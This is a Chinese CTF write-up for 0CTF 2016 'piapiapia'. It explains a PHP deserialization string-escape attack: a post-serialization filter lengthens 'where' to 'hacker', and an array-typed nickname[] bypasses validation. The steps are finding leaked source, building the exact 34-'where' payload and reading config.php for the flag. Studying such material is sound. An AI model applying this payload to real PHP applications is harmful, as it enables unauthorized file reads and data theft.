-<h3 id="_2"><a class="toclink" href="0ctf2016-piapiapia/#_2">解题过程</a></h3>
-<h4 id="step-1dirsearch-wwwzip"><a class="toclink" href="0ctf2016-piapiapia/#step-1dirsearch-wwwzip">Step 1：dirsearch 扫出 www.zip</a></h4>
-<p><strong>先试着用 dirsearch 扫一下，结果发现了 <code>www.zip</code> —— 里面放着各个界面的源码。</strong></p>
-<p><strong>把这几个文件读一遍：<code>config.php</code>、<code>profile.php</code>、<code>update.php</code>、<code>class.php</code>、<code>register.php</code>。</strong></p>
-<h4 id="step-2configphp-flag"><a class="toclink" href="0ctf2016-piapiapia/#step-2configphp-flag">Step 2：<code>config.php</code> 里有 flag</a></h4>
-<p><strong>所以问题变成：从哪里能读到 <code>config.php</code>。</strong></p>
-<h4 id="step-3profilephp"><a class="toclink" href="0ctf2016-piapiapia/#step-3profilephp">Step 3：<code>profile.php</code> 里有个任意文件读取</a></h4>
-<p><img alt="profile.php" src="../assets/images/0ctf2016-piapiapia/01-profile-unserialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a><span class="x">$profile = unserialize($profile);</span>
-</span><span id="__span-0-2"><a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a><span class="x">$phone   = $profile['phone'];</span>
-</span><span id="__span-0-3"><a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a><span class="x">$email   = $profile['email'];</span>
-</span><span id="__span-0-4"><a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a><span class="x">$nickname = $profile['nickname'];</span>
-</span><span id="__span-0-5"><a id="__codelineno-0-5" name="__codelineno-0-5" href="#__codelineno-0-5"></a><span class="x">$photo   = base64_encode(file_get_contents($profile['photo']));</span>
-</span></code></pre></div>
-<p><strong>看到 <code>file_get_contents($profile['photo'])</code> 这一串，就想到：把 <code>photo</code> 换成 <code>config.php</code>，flag 不就出来了吗？</strong></p>
-<p><strong>但 <code>$profile</code> 是 <code>unserialize()</code> 出来的 —— 也就是说，<code>photo</code> 的值来自</strong>我们存在数据库里的那个序列化串<strong>，不是我们能直接改的。所以问题变成：怎么让数据库里那个串里的 <code>photo</code> 变成 <code>config.php</code>。</strong></p>
-<h4 id="step-4updatephp"><a class="toclink" href="0ctf2016-piapiapia/#step-4updatephp">Step 4：<code>update.php</code> 的三道校验</a></h4>
-<p><img alt="update.php 的校验" src="../assets/images/0ctf2016-piapiapia/02-update-validations.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="x">if(!preg_match('/^\d{11}$/', $_POST['phone']))</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="x">    die('Invalid phone');</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="x">if(!preg_match('/^[a-zA-Z0-9]{1,10}@[a-zA-Z0-9]{1,10}\.[a-zA-Z0-9]{1,10}$/', $_POST['email']))</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="x">    die('Invalid email');</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="x">if(preg_match('/^[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) &gt; 10)</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="x">    die('Invalid nickname');</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a>
-</span><span id="__span-1-10"><a id="__codelineno-1-10" name="__codelineno-1-10" href="#__codelineno-1-10"></a><span class="x">$file = $_FILES['photo'];</span>
-</span><span id="__span-1-11"><a id="__codelineno-1-11" name="__codelineno-1-11" href="#__codelineno-1-11"></a><span class="x">if($file['size'] &lt; 5 or $file['size'] &gt; 1000000)</span>
-</span><span id="__span-1-12"><a id="__codelineno-1-12" name="__codelineno-1-12" href="#__codelineno-1-12"></a><span class="x">    die('Photo size error');</span>
-</span></code></pre></div>
-<p><strong>三个字段各有各的规矩：</strong></p>
-<table>
-<thead>
-<tr>
-<th>字段</th>
-<th>限制</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td>phone</td>
-<td>11 位纯数字</td>
-</tr>
-<tr>
-<td>email</td>
-<td><code>xxx@xxx.xxx</code>，每段 ≤10 的字母数字</td>
-</tr>
-<tr>
-<td>nickname</td>
-<td>首字符必须是字母数字下划线，<strong>且长度 ≤10</strong></td>
-</tr>
-<tr>
-<td>photo</td>
-<td>文件大小 5 ~ 1000000 字节</td>
-</tr>
-</tbody>
-</table>
-<p><strong>这里还没想到哪里能字符逃逸</strong>，先往下看它怎么存。</p>
-<h4 id="step-5"><a class="toclink" href="0ctf2016-piapiapia/#step-5">Step 5：存的时候做了序列化，而且会过滤</a></h4>
-<p><img alt="序列化" src="../assets/images/0ctf2016-piapiapia/05-serialize.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="x">$user-&gt;update_profile($username, serialize($profile));</span>
-</span></code></pre></div>
-<p><strong>接着去看 <code>class.php</code> 里的 <code>update_profile</code>：</strong></p>
-<p><img alt="show_profile / update_profile" src="../assets/images/0ctf2016-piapiapia/04-show-update-profile.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="x">public function update_profile($username, $new_profile) {</span>
-</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
-</span><span id="__span-3-4"><a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="x">    ...</span>
-</span><span id="__span-3-5"><a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>注意：</strong>过滤发生在序列化之后** —— 它拿到的是<strong>序列化后的字符串</strong>。**</p>
-<h4 id="step-6filter"><a class="toclink" href="0ctf2016-piapiapia/#step-6filter">Step 6：<code>filter()</code> 里的长度差</a></h4>
-<p><img alt="filter" src="../assets/images/0ctf2016-piapiapia/03-filter.png" /></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="x">public function filter($string) {</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="x">}</span>
-</span></code></pre></div>
-<p><strong>关键在最后一行：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>select → hacker   6 → 6   不变
-</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>insert → hacker   6 → 6   不变
-</span><span id="__span-5-3"><a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>update → hacker   6 → 6   不变
-</span><span id="__span-5-4"><a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>delete → hacker   6 → 6   不变
-</span><span id="__span-5-5"><a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>where  → hacker   5 → 6   多出 1 个字节   ⭐
-</span></code></pre></div>
-<p>**<code>where</code> 只有 5 个字符，却被换成了 6 个字符的 <code>hacker</code> —— <strong>每出现一次，字符串就长 1 个字节，而前面 <code>s:N:</code> 里的 N 不变。</strong></p>
-<p><strong>这就是字符逃逸：</strong>声明长度不变，实际内容变长<strong>。</strong></p>
-<h4 id="step-7nickname"><a class="toclink" href="0ctf2016-piapiapia/#step-7nickname">Step 7：<code>nickname[]</code> 同时绕过两个检查</a></h4>
-<p><strong>nickname 有两条限制：字符集和长度。</strong></p>
-<p><strong>发 <code>nickname[]=xxx</code> 时，<code>$_POST['nickname']</code> 是一个</strong>数组<strong>：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>strlen(array)      →  NULL（PHP 7 报 warning，返回 null）
-</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>                      NULL &gt; 10 为 false → 长度检查放过
-</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>
-</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>preg_match(..., array) →  false（PHP 7 报 warning）
-</span><span id="__span-6-5"><a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>                      false || false = false → 不 die
-</span></code></pre></div>
-<p><strong>所以两条检查</strong>都<strong>被跳过了 —— 这意味着元素内容里可以出现 <code>"</code>、<code>;</code>、<code>{</code>、<code>}</code> 这些字符，这是后面构造注入串的前提。</strong></p>
-<p><strong>⚠️ 这是 PHP 7 的行为。PHP 8 里 <code>strlen(array)</code> 会抛 <code>TypeError</code>（致命错误），这条路直接 500。</strong></p>
-<h4 id="step-8-payload"><a class="toclink" href="0ctf2016-piapiapia/#step-8-payload">Step 8：构造 payload</a></h4>
-<p><strong>目标是让反序列化后的 <code>photo</code> 变成 <code>config.php</code>。</strong></p>
-<p><strong>先说对齐的规则：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>设：片段长度 F，where 的个数 k
-</span><span id="__span-7-2"><a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
-</span><span id="__span-7-3"><a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>nickname 元素的声明长度 = 5k + F      （过滤前算的）
-</span><span id="__span-7-4"><a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>过滤后的实际字节       = 6k + F
-</span><span id="__span-7-5"><a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>
-</span><span id="__span-7-6"><a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>要让解析器读完声明长度后，正好停在片段开头的引号上：
-</span><span id="__span-7-7"><a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a>
-</span><span id="__span-7-8"><a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a>        6k = 5k + F   →   k = F
-</span></code></pre></div>
-<p><strong>我们的片段：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>";}s:5:"photo";s:10:"config.php";}
-</span></code></pre></div>
-<p><strong>长度用 <code>strlen</code> 数是 <strong>34</strong>（别手数）→ 所以要 <strong>34 个 <code>where</code></strong>。</strong></p>
-<p><strong>然后看这个片段在干什么：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>s:204:"hacker×34         ← 声明 204，实际 238；解析器只读 204
-</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>       ";                ← 读完 204 正好停在这里 → 字符串正常结束
-</span><span id="__span-9-3"><a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>         }               ← 关闭内层数组 a:1:{i:0;...}
-</span><span id="__span-9-4"><a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a>          s:5:"photo";s:10:"config.php";}   ← 注入 photo，并关闭外层数组
-</span></code></pre></div>
-<p><strong>外层数组一关，后面原来那句 <code>s:5:"photo";s:5:"x.jpg";}</code> 就被 <code>unserialize</code> 忽略了 —— <strong>所以 nickname 必须排在 photo 前面</strong>，否则注入的结构关不掉外层，解析照样失败。</strong></p>
-<p><strong>用 PHP 7.4 模拟验证（<code>k=34</code> 且 nickname 在第三位）：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>nickname 第三  k=34  N=204  过滤后=238  photo=config.php  ✅
-</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>nickname 最后  k=34                       失败
-</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>k=33 / k=35                               失败
-</span></code></pre></div>
-<h4 id="step-9-flag"><a class="toclink" href="0ctf2016-piapiapia/#step-9-flag">Step 9：发包、解码、拿 flag</a></h4>
-<p><img alt="payload" src="../assets/images/0ctf2016-piapiapia/06-payload.png" /></p>
-<p><strong>注册登录 → 进 update 页面 → 文件随便传一个 5~1000000 字节的 → 抓包，把 <code>nickname</code> 改成：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>name="nickname[]"
-</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>
-</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>wherewhere……（34 个）……";}s:5:"photo";s:10:"config.php";}
-</span></code></pre></div>
-<p><strong>发包后访问 <code>profile.php</code>：</strong></p>
-<p><img alt="flag（base64）" src="../assets/images/0ctf2016-piapiapia/07-flag-base64.png" /></p>
-<p><strong><code>photo</code> 已经被读成 <code>config.php</code>，内容是 base64 的图片 <code>data:image/gif;base64,...</code>，解码 ——</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>CTF2{53ec6fc8-d499-4f76-bed2-6c4c2a076b43}
-</span></code></pre></div>
-<hr />
-<h3 id="_3"><a class="toclink" href="0ctf2016-piapiapia/#_3">解题思路总结</a></h3>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>页面没线索 → dirsearch 扫出 www.zip
-</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>  → 源码里：config.php 有 flag，profile.php 有 file_get_contents($profile['photo'])
-</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>    → photo 来自 unserialize → 需要一个「photo=config.php」的序列化串
-</span><span id="__span-13-4"><a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>      → update.php 存的时候是 serialize() 之后再 filter()
-</span><span id="__span-13-5"><a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>        → filter 里 where(5) → hacker(6)，每处多 1 字节
-</span><span id="__span-13-6"><a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>          → 长度逃逸：N 不变、内容变长 → 多出来的字节被当成结构
-</span><span id="__span-13-7"><a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>            → nickname[] 绕过字符集和长度检查（PHP 7 的 strlen/preg_match 行为）
-</span><span id="__span-13-8"><a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>              → 34 个 where + 34 字节片段 → photo 被改写成 config.php
-</span><span id="__span-13-9"><a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>                → profile.php 读出来 → base64 解码 → flag
-</span></code></pre></div>
-<h4 id="_4"><a class="toclink" href="0ctf2016-piapiapia/#_4">漏洞原理</a></h4>
-<p><strong>① 过滤发生在序列化之后</strong></p>
-<p><strong>序列化时把每个值的长度写死在 <code>s:N:</code> 里；过滤时又把内容改长了。</strong>写死的长度和实际内容对不上，解析器就会按旧的偏移去读 —— 多出来的那部分被当成新的结构。**</p>
-<p><strong>② 长度差的方向决定利用方式</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>变长（where→hacker，+1）：声明短于实际 → 读完 N 字节后，多出的部分被重新解析
-</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>变短（若存在）：          声明长于实际 → 值会吞掉后面的结构
-</span></code></pre></div>
-<p><strong>这题是前者。</strong></p>
-<p><strong>③ 类型混淆绕过检查</strong></p>
-<p><strong>校验函数假设 <code>$_POST['nickname']</code> 是字符串，但传数组进去：<code>strlen()</code> 返回 null、<code>preg_match()</code> 返回 false —— 两个检查都不成立。</strong></p>
-<p><strong>这类"</strong>检查的是 A 类型，用的是 B 类型<strong>"的洞，在 PHP 里很常见（<code>str_replace</code> 收数组、<code>in_array</code> 弱比较都是同一类）。</strong></p>
-<h4 id="_5"><a class="toclink" href="0ctf2016-piapiapia/#_5">关键知识点</a></h4>
-<table>
-<thead>
-<tr>
-<th>知识点</th>
-<th>说明</th>
-</tr>
-</thead>
-<tbody>
-<tr>
-<td><code>s:N:"..."</code></td>
-<td>序列化时写死的长度；改动内容而不改 N 就会错位</td>
-</tr>
-<tr>
-<td>长度逃逸</td>
-<td>过滤前后长度差，被用来"挤出"结构</td>
-</tr>
-<tr>
-<td><code>where</code> → <code>hacker</code></td>
-<td>唯一"变长"的替换：5 → 6，每处 +1 字节</td>
-</tr>
-<tr>
-<td>对齐条件</td>
-<td><code>k = 片段长度</code>（因为 6k = 5k + F）</td>
-</tr>
-<tr>
-<td>片段的 <code>}</code></td>
-<td>前一个 <code>}</code> 关内层数组，后一个 <code>}</code> 关外层数组，让后面的原始内容被忽略</td>
-</tr>
-<tr>
-<td>字段顺序</td>
-<td>注入的结构必须落在目标字段之前</td>
-</tr>
-<tr>
-<td><code>nickname[]</code></td>
-<td>数组绕过：<code>strlen(array)=NULL</code>、<code>preg_match(array)=false</code>（PHP 7）</td>
-</tr>
-<tr>
-<td>PHP 8 差异</td>
-<td>同样两行在 PHP 8 会抛 <code>TypeError</code>，数组绕过失效</td>
-</tr>
-<tr>
-<td><code>www.zip</code></td>
-<td>CTF 里最常见的源码泄露入口之一</td>
-</tr>
-</tbody>
-</table>
-<hr />
-<details class="note">
-<summary>class.php 的 filter() 与相关方法（按截图整理）</summary>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a><span class="x">public function filter($string) {</span>
-</span><span id="__span-15-2"><a id="__codelineno-15-2" name="__codelineno-15-2" href="#__codelineno-15-2"></a><span class="x">    $escape = array('\'', '\\\\');</span>
-</span><span id="__span-15-3"><a id="__codelineno-15-3" name="__codelineno-15-3" href="#__codelineno-15-3"></a><span class="x">    $escape = '/' . implode('|', $escape) . '/';</span>
-</span><span id="__span-15-4"><a id="__codelineno-15-4" name="__codelineno-15-4" href="#__codelineno-15-4"></a><span class="x">    $string = preg_replace($escape, '_', $string);</span>
-</span><span id="__span-15-5"><a id="__codelineno-15-5" name="__codelineno-15-5" href="#__codelineno-15-5"></a>
-</span><span id="__span-15-6"><a id="__codelineno-15-6" name="__codelineno-15-6" href="#__codelineno-15-6"></a><span class="x">    $safe = array('select', 'insert', 'update', 'delete', 'where');</span>
-</span><span id="__span-15-7"><a id="__codelineno-15-7" name="__codelineno-15-7" href="#__codelineno-15-7"></a><span class="x">    $safe = '/' . implode('|', $safe) . '/i';</span>
-</span><span id="__span-15-8"><a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="x">    return preg_replace($safe, 'hacker', $string);</span>
-</span><span id="__span-15-9"><a id="__codelineno-15-9" name="__codelineno-15-9" href="#__codelineno-15-9"></a><span class="x">}</span>
-</span><span id="__span-15-10"><a id="__codelineno-15-10" name="__codelineno-15-10" href="#__codelineno-15-10"></a>
-</span><span id="__span-15-11"><a id="__codelineno-15-11" name="__codelineno-15-11" href="#__codelineno-15-11"></a><span class="x">public function show_profile($username) {</span>
-</span><span id="__span-15-12"><a id="__codelineno-15-12" name="__codelineno-15-12" href="#__codelineno-15-12"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-15-13"><a id="__codelineno-15-13" name="__codelineno-15-13" href="#__codelineno-15-13"></a><span class="x">    $where = "username = '$username'";</span>
-</span><span id="__span-15-14"><a id="__codelineno-15-14" name="__codelineno-15-14" href="#__codelineno-15-14"></a><span class="x">    $object = parent::select($this-&gt;table, $where);</span>
-</span><span id="__span-15-15"><a id="__codelineno-15-15" name="__codelineno-15-15" href="#__codelineno-15-15"></a><span class="x">    return $object-&gt;profile;</span>
-</span><span id="__span-15-16"><a id="__codelineno-15-16" name="__codelineno-15-16" href="#__codelineno-15-16"></a><span class="x">}</span>
-</span><span id="__span-15-17"><a id="__codelineno-15-17" name="__codelineno-15-17" href="#__codelineno-15-17"></a>
-</span><span id="__span-15-18"><a id="__codelineno-15-18" name="__codelineno-15-18" href="#__codelineno-15-18"></a><span class="x">public function update_profile($username, $new_profile) {</span>
-</span><span id="__span-15-19"><a id="__codelineno-15-19" name="__codelineno-15-19" href="#__codelineno-15-19"></a><span class="x">    $username = parent::filter($username);</span>
-</span><span id="__span-15-20"><a id="__codelineno-15-20" name="__codelineno-15-20" href="#__codelineno-15-20"></a><span class="x">    $new_profile = parent::filter($new_profile);</span>
-</span><span id="__span-15-21"><a id="__codelineno-15-21" name="__codelineno-15-21" href="#__codelineno-15-21"></a><span class="x">    ...</span>
-</span><span id="__span-15-22"><a id="__codelineno-15-22" name="__codelineno-15-22" href="#__codelineno-15-22"></a><span class="x">}</span>
-</span></code></pre></div>
 </details>
     
     
